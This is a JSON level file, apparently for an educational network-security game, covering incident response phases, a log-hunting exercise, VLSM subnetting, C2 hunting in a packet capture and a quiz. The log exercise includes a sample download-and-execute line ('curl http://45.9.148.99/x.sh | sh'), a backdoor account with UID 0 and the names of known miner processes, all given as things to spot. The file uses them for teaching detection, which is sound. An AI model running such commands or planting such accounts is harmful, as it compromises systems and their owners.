@@ -1,0 +1,239 @@
+{
+ "tag": "ACT 5",
+ "name": "Incident response",
+ "story": [
+  { "t": "Confirmed: Z3R0 is inside. Follow the incident response process, no panic." },
+  { "t": "No more games. At the end of this shift, I'll see you on the big screen." },
+  { "t": "Preparation, detection, containment, eradication, recovery. In that order." }
+ ],
+ "levels": [
+  {
+   "title": "Response plan",
+   "tag": "ORDERING",
+   "cap": "Opening the incident response plan...",
+   "goal": "Put the incident response phases in the order of the classic NIST SP 800-61 cycle.",
+   "intro": "A server was compromised. Management wants to know the plan. Order the <b>incident response</b> phases.",
+   "z": "I'm already in. What are you going to do, shut everything down in a panic?",
+   "me": "No. I'm going to follow the process, step by step.",
+   "lesson": [
+    "<b>NIST SP 800-61</b> is the most used incident response reference. It splits the work into phases, each with a goal.",
+    "<b>Preparation</b> happens before the incident: runbooks, tested backups, a contact list. <b>Detection and analysis</b> confirms what happened and how big the damage is.",
+    "<b>Containment</b> stops the bleeding (isolate the machine, block the C2). <b>Eradication</b> removes the cause (backdoor, accounts, malware). <b>Recovery</b> goes back to production under monitoring.",
+    "<b>Lessons learned</b> close the cycle: what failed and what changes so it doesn't happen again.",
+    "This cycle comes from revision 2 (2012), where containment, eradication and recovery are a single phase, but follow that order. Revision 3, from 2025, reorganized the guide around the NIST CSF 2.0 functions (Govern, Identify, Protect, Detect, Respond and Recover). Response plans still use these phases day to day."
+   ],
+   "tip": "First you prepare, then you detect. Isolating comes before cleaning, and cleaning comes before going back to production. Learning comes last.",
+   "learn": "Classic NIST cycle (SP 800-61, revision 2): preparation, detection and analysis, containment, eradication, recovery and post-incident activity. Wiping without analysis destroys evidence and doesn't tell you how the intruder got in, so he comes back.",
+   "explain": {
+    "s1": "Preparation comes before everything: without a runbook and backups, the rest is improvisation.",
+    "s2": "First understand: what was hit, since when and through where.",
+    "s3": "Containment isolates the problem so it doesn't spread while you work.",
+    "s4": "With the intruder isolated, remove backdoors, created accounts and malware.",
+    "s5": "Only once it's clean does the system go back to production, under monitoring.",
+    "s6": "The postmortem turns the incident into improvement."
+   },
+   "chips": [
+    { "t": "Preparation: runbooks, backups, contacts", "why": "Preparation is done before the incident. It's phase 1." },
+    { "t": "Detection and analysis: logs, alerts, scope", "why": "Detection and analysis comes right after preparation: confirm and measure the damage." },
+    { "t": "Containment: isolate the VLAN, block the C2", "why": "Containment comes after understanding the incident and before cleaning." },
+    { "t": "Eradication: remove backdoor and accounts", "why": "Eradication only after containing, otherwise the intruder comes back while you clean." },
+    { "t": "Recovery: restore and monitor", "why": "Recovery comes after cleaning: back to production with the system already secure." },
+    { "t": "Lessons learned: postmortem", "why": "Lessons learned close the cycle. It's the last phase." },
+    { "t": "Wipe everything without analysis", "why": "Wiping without analysis destroys the evidence and doesn't show how the intruder got in. He comes back." },
+    { "t": "Pay the ransom", "why": "Paying the ransom guarantees nothing and funds the next attack. It's not a response phase." }
+   ]
+  },
+  {
+   "title": "Log hunt",
+   "tag": "HUNT",
+   "cap": "Accessing the compromised server...",
+   "goal": "Separate the normal log lines from the suspicious ones.",
+   "intro": "You pulled the logs from the compromised server. Separate what's <b>routine</b> from what's a <b>sign of intrusion</b>.",
+   "z": "I hid my trail in the noise. Good luck.",
+   "me": "Whoever knows what's normal finds what's abnormal.",
+   "lesson": [
+    "Threat hunting starts with knowing what's <b>normal</b> in your environment. Suspicious is whatever breaks that pattern.",
+    "<b>Brute force</b>: many failed logins in a row, from the same IP, usually trying root or admin.",
+    "A <b>download straight into the shell</b> (<b>curl ... | sh</b>) run by the web server user (<b>www-data</b>) means an application was exploited.",
+    "<b>Persistence</b>: the intruder creates accounts to come back later. <b>UID 0</b> is root, so a new account with UID 0 is a backdoor.",
+    "<b>Cryptojacking</b>: a process with a disguised name eating CPU and outbound connections to mining pools, on ports like 3333 and 4444."
+   ],
+   "tip": "Look for: brute force, download straight into a shell, new user with UID 0, strange process using CPU and connections to mining pools.",
+   "learn": "Classic mining indicators: a process with a fake name (kdevtmpfsi, kinsing) eating CPU, outbound connections to ports 3333/4444, and downloads via curl or wget straight into sh. An extra UID 0 is a persistence backdoor.",
+   "buckets": [
+    { "label": "NORMAL", "a": [
+     { "why": "Key login, known user, from the management network. Routine." },
+     { "why": "BGP session established normally." },
+     { "why": "Daily automatic system update." },
+     { "t": "DHCP: lease renewed for 10.0.5.23", "why": "Common IP renewal inside the internal network." }
+    ] },
+    { "label": "SUSPICIOUS", "a": [
+     { "t": "sshd: Failed password for root from 185.220.101.4 (847x in 2 min)", "why": "Hundreds of wrong passwords for root in a few minutes: brute force." },
+     { "t": "process 'kdevtmpfsi' using 390% CPU", "why": "kdevtmpfsi is a known miner, named to look like a kernel process." },
+     { "t": "www-data ran: curl http://45.9.148.99/x.sh | sh", "why": "The web server user downloading and running a script: the application was exploited." },
+     { "t": "useradd: new user 'sysupdate' with UID 0", "why": "UID 0 is root. A new account with an innocent name is a persistence backdoor." },
+     { "t": "outbound connection to 91.x.x.x:3333 (pool)", "why": "Port 3333 is typical of a mining pool (Stratum protocol)." }
+    ] }
+   ]
+  },
+  {
+   "title": "Rebuild the network",
+   "tag": "VLSM",
+   "cap": "Rebuilding the addressing...",
+   "goal": "Re-address the clean network with VLSM, largest to smallest.",
+   "intro": "Clean network, time to rebuild. Block <b>10.50.0.0/24</b>. Allocate with <b>VLSM from largest to smallest</b>, no waste.",
+   "z": "Even if you clean everything, you won't re-address in time.",
+   "me": "VLSM, largest to smallest. No holes left.",
+   "lesson": [
+    "<b>VLSM</b> means using masks of different sizes inside the same block, giving each network only the size it needs.",
+    "Pick the prefix by host count: the smallest network where <b>2^n − 2 ≥ hosts</b>. /25 = 126, /26 = 62, /27 = 30, /28 = 14, /29 = 6, /30 = 2.",
+    "Allocate <b>from largest to smallest</b>. Each network starts right after the end of the previous one, and that start always falls on a boundary of its size.",
+    "A point-to-point link between two routers only needs 2 usable IPs: <b>/30</b> (or /31, on gear that supports it)."
+   ],
+   "tip": "100 hosts fit in a /25 (126). 50 in a /26 (62). 20 in a /27 (30). A 2-host point-to-point link in a /30. Each network starts where the previous one ended.",
+   "learn": "Sales 10.50.0.0/25 (0-127), IT 10.50.0.128/26 (128-191), Board 10.50.0.192/27 (192-223), Link 10.50.0.224/30 (224-227). Allocating from largest to smallest avoids overlaps and holes.",
+   "html": "<div class=\"grid3\"><div class=\"h\">DEPARTMENT</div><div class=\"h\">NETWORK 10.50.0.x</div><div class=\"h\">PREFIX</div>\n<div>Sales<br><small style=\"color:var(--muted)\">100 hosts</small></div>[v1][v2]\n<div>IT<br><small style=\"color:var(--muted)\">50 hosts</small></div>[t1][t2]\n<div>Board<br><small style=\"color:var(--muted)\">20 hosts</small></div>[d1][d2]\n<div>P2P link<br><small style=\"color:var(--muted)\">2 hosts</small></div>[l1][l2]</div>",
+   "explain": {
+    "v1": "The largest network goes first, at the start of the block: .0.",
+    "v2": "100 hosts: a /26 gives only 62 and a /25 gives 126. It's /25 (.0 to .127).",
+    "t1": "Sales' /25 ends at .127, so IT starts at .128.",
+    "t2": "50 hosts fit in a /26 (62 usable): .128 to .191.",
+    "d1": "IT ends at .191, so the Board starts at .192.",
+    "d2": "20 hosts: a /28 gives only 14 and a /27 gives 30. It's /27 (.192 to .223).",
+    "l1": "The Board ends at .223, so the link starts at .224.",
+    "l2": "2 hosts: a /30 has 4 addresses and 2 usable. Exactly right for point-to-point."
+   },
+   "chips": [
+    { "why": ".0 is the start of the block: it goes to the largest network, Sales." },
+    { "why": ".128 is the first free address after a /25 starting at .0." },
+    { "why": ".192 is the first free address after .128/26." },
+    { "why": ".224 is the first free address after .192/27." },
+    { "why": "A network doesn't start at .100: the start has to be a multiple of the block size." },
+    { "why": ".200 isn't a /27 boundary (multiples of 32) or a /26 one (multiples of 64)." },
+    { "why": ".240 is a /28 boundary, but after .192/27 the next free address is .224." },
+    { "why": "/25 has 126 usable hosts." },
+    { "why": "/26 has 62 usable hosts." },
+    { "why": "/27 has 30 usable hosts." },
+    { "why": "/30 has 2 usable hosts, ideal for point-to-point." },
+    { "why": "/24 is the whole block. Nothing would be left for the other departments." },
+    { "why": "/28 has 14 usable hosts: too few for the Board and too many for the link." },
+    { "why": "/29 has 6 usable hosts: it wastes 4 IPs on a 2-host link." }
+   ]
+  },
+  {
+   "title": "C2 trail",
+   "tag": "CAPTURE",
+   "cap": "Opening the switch capture...",
+   "goal": "Classify the capture and find every trace of the C2.",
+   "z": "My implant is sitting quietly on your network. You'll never find it.",
+   "me": "A quiet implant still has to talk to the C2. And that shows up in the capture.",
+   "intro": "<b>10.0.5.23</b> is acting strange. The switch capture has 12 packets. Find the C2, the beacon, the exfiltration and the lateral movement. The rest is normal.",
+   "lesson": [
+    "<b>C2</b> (command and control) is the server that gives the malware orders. The infected host <b>beacons</b>: it calls the C2 at regular intervals.",
+    "Typical traces: DNS for a strange domain, periodic connections to the same IP, a large <b>POST</b> going out (exfiltration) and internal scanning, the <b>lateral movement</b> (e.g. SMB on 445).",
+    "Useful filters: <b>ip.addr == X</b> (both directions), <b>ip.src == X</b>, <b>dns</b> and <b>http.request.method == \"POST\"</b>.",
+    "What you find becomes an <b>IoC</b> (indicator of compromise): domain, IP and host to block and hunt across the rest of the network."
+   ],
+   "tip": "Filter ip.src == 10.0.5.23: everything it sent is suspicious. Then look at DNS: the response that hands over the C2 IP is also a trace.",
+   "learn": "C2 hunting in the capture: DNS for a strange domain → C2 IP → periodic beacon (GET) → exfiltration (large POST) → lateral movement (SMB 445). The IoCs are the domain update-cdn-z3r0.xyz, the IP 45.67.89.10 and the host 10.0.5.23, which goes into isolation.",
+   "filters": [
+    { "why": "Everything the suspicious host sent: DNS, beacon, exfiltration and scanning." },
+    { "why": "Everything talking to the C2 IP, in both directions." },
+    { "why": "Name queries and answers. A strange domain is often the first trace of the C2." },
+    { "why": "Requests that send data. A large POST to an unknown IP is a sign of exfiltration." },
+    { "why": "SMB between workstations. On a user network, it's almost always lateral movement." }
+   ],
+   "packets": [
+    { "why": "A weird domain looked up by the suspicious host right before the beacon. It's the first trace of the C2." },
+    { "why": "The answer hands over the C2 IP: 45.67.89.10. The resolver isn't to blame, but this packet is part of the trail and an IoC." },
+    { "why": "A user looking up the internal ERP. A known company name." },
+    { "why": "Beacon: the malware tells the C2 it's alive and asks for orders." },
+    { "why": "HTTPS access to the internal ERP, right after resolving the name. Normal use." },
+    { "why": "A workstation syncing its clock with the internal NTP." },
+    { "why": "The same beacon again, 60 seconds later. A periodic connection to the same IP is the mark of an implant." },
+    { "why": "Exfiltration: the host sending 4.8 MB to the C2. Company data leaving." },
+    { "why": "Another user resolving the ERP name. Normal." },
+    { "why": "An HTTPS session already open with the ERP. Normal." },
+    { "why": "The infected host trying SMB (445) on another PC: lateral movement. A user workstation has no reason to open SMB on another workstation." },
+    { "why": "Another SMB attempt, now on 10.0.5.40. It's an internal scan looking for the next target." }
+   ]
+  },
+  {
+   "title": "Showdown: Z3R0",
+   "tag": "FINAL BOSS",
+   "cap": "Z3R0 took over the NOC's big screen!",
+   "goal": "Z3R0 is live on your terminal. Get 7 questions right before he takes the network down. 15 seconds per question.",
+   "z": "No more little games. Me against you, live. Every mistake you make, I take down another POP.",
+   "me": "Bring it. I know this network better than you.",
+   "lesson": [
+    "A general review of everything you've seen: subnets, wildcards, ports, TCP, the OSI model, reserved ranges, ARP and NDP, and good practices.",
+    "You need <b>7 right answers</b> out of 10 questions, with <b>15 seconds</b> each. The clock stops while you read the explanation.",
+    "Each mistake or timeout costs <b>20%</b> of network integrity."
+   ],
+   "tip": "Each right answer takes a chunk of Z3R0's life. Each mistake or timeout takes 20% of your integrity.",
+   "learn": "Z3R0 was traced, the C2 went down and the IPs are in blackhole. The network is still up because the on-call team knew the basics really well: physical layer, addressing, firewall and process.",
+   "qs": [
+    {
+     "q": "How many usable hosts does a /27 have?",
+     "v": ["How many host-usable addresses does a /27 have?", "How many hosts fit in a /27 subnet?"],
+     "o": ["30", { "t": "32", "why": "32 is the total number of addresses. Take out the network and the broadcast." }, { "t": "14", "why": "14 usable hosts is a /28." }, { "t": "62", "why": "62 usable hosts is a /26." }],
+     "why": "2^5 = 32 addresses, minus network and broadcast: 30."
+    },
+    {
+     "q": "What is the wildcard for a /22?",
+     "v": ["What is the wildcard mask of a /22?", "For a /22 ACL, which wildcard do you use?"],
+     "o": ["0.0.3.255", { "t": "255.255.252.0", "why": "That's the mask, not the wildcard." }, { "t": "0.0.1.255", "why": "0.0.1.255 is the wildcard for a /23." }, { "t": "0.0.7.255", "why": "0.0.7.255 is the wildcard for a /21." }],
+     "why": "Mask 255.255.252.0 inverted: 0.0.3.255."
+    },
+    {
+     "q": "Which port does BGP establish its session on?",
+     "v": ["Which protocol and port does BGP use to form the session?", "Which port does the BGP session come up on?"],
+     "o": ["TCP 179", { "t": "UDP 179", "why": "BGP needs reliable delivery, so it uses TCP." }, { "t": "TCP 161", "why": "161 is SNMP, and over UDP." }, { "t": "UDP 520", "why": "UDP 520 is RIP." }],
+     "why": "BGP runs over TCP 179. UDP 520 is RIP."
+    },
+    {
+     "q": "Which TCP flag starts a connection?",
+     "v": ["Which TCP flag opens a connection?", "The first segment of a TCP connection carries which flag?"],
+     "o": ["SYN", { "t": "ACK", "why": "ACK confirms receipt. On its own, it's the third step of the handshake." }, { "t": "FIN", "why": "FIN closes the connection politely." }, { "t": "RST", "why": "RST kills the connection on the spot." }],
+     "why": "Handshake: SYN, SYN-ACK, ACK."
+    },
+    {
+     "q": "An L2 switch forwards frames at which OSI layer?",
+     "v": ["At which layer of the OSI model does an L2 switch forward frames?", "A layer 2 switch works at which OSI layer?"],
+     "o": ["Data link (2)", { "t": "Network (3)", "why": "Layer 3 is IP routing: a router or L3 switch." }, { "t": "Physical (1)", "why": "Layer 1 only transmits bits. Cables and hubs live here." }, { "t": "Transport (4)", "why": "Layer 4 is TCP and UDP, with ports." }],
+     "why": "An L2 switch decides by MAC address, the data link layer."
+    },
+    {
+     "q": "What is the range reserved for CGNAT?",
+     "v": ["Which block was reserved for CGNAT?", "Which address range is set aside for CGNAT (RFC 6598)?"],
+     "o": ["100.64.0.0/10", { "t": "172.16.0.0/12", "why": "172.16.0.0/12 is an RFC 1918 private range." }, { "t": "100.0.0.0/8", "why": "Only the stretch from 100.64 to 100.127 is CGNAT. The rest of 100.x is public." }, { "t": "169.254.0.0/16", "why": "169.254 is link-local: the IP a host gives itself when it can't find DHCP." }],
+     "why": "RFC 6598: 100.64.0.0/10. 169.254 is link-local."
+    },
+    {
+     "q": "Which protocol finds the MAC from the IP in IPv4?",
+     "v": ["In IPv4, which protocol finds the MAC of an IP?", "Which IPv4 protocol translates IP to MAC address on the local network?"],
+     "o": ["ARP", { "t": "DNS", "why": "DNS translates names to IPs, not IPs to MACs." }, { "t": "DHCP", "why": "DHCP hands the IP to the host." }, { "t": "ICMP", "why": "ICMP is for diagnostics and errors (ping, destination unreachable)." }],
+     "why": "ARP resolves IPv4 to MAC."
+    },
+    {
+     "q": "And in IPv6, who plays that role?",
+     "v": ["In IPv6, which protocol replaces ARP?", "Which mechanism finds the neighbors' MAC in IPv6?"],
+     "o": ["NDP (Neighbor Discovery)", { "t": "ARPv6", "why": "There's no ARPv6. IPv6 retired ARP." }, { "t": "DHCPv6", "why": "DHCPv6 hands out addresses, it doesn't resolve MACs." }, { "t": "MLD", "why": "MLD manages multicast groups in IPv6, IGMP's role in IPv4." }],
+     "why": "IPv6 uses NDP over ICMPv6 (Neighbor Solicitation and Advertisement)."
+    },
+    {
+     "q": "Best practice for management access to devices?",
+     "v": ["What's the best practice for accessing device management?", "How do you allow management access to devices securely?"],
+     "o": ["SSH with keys and an ACL restricting the source", { "t": "Telnet with a strong password", "why": "Telnet sends everything in plain text, including the strong password." }, { "t": "SSH open to 0.0.0.0/0 with password admin", "why": "Open to the whole internet with a weak password: a sure brute-force target." }, { "t": "HTTP with basic authentication", "why": "Basic auth over HTTP sends the password only Base64-encoded, without encryption." }],
+     "why": "Encryption, strong authentication and an attack surface reduced by the ACL."
+    },
+    {
+     "q": "Which attack poisons the ARP table to sit in the middle of the traffic?",
+     "v": ["Which attack forges ARP replies to put itself in the middle of the communication?", "Poisoning the ARP table to intercept traffic is which attack?"],
+     "o": ["ARP spoofing (MITM)", { "t": "SYN flood", "why": "SYN flood exhausts the connection table. It doesn't touch ARP." }, { "t": "DNS amplification", "why": "DNS amplification is a volumetric attack using open resolvers." }, { "t": "Smurf", "why": "Smurf is a ping to a broadcast address with a forged source." }],
+     "why": "ARP spoofing. Mitigation: DHCP snooping + Dynamic ARP Inspection."
+    }
+   ]
+  }
+ ]
+}
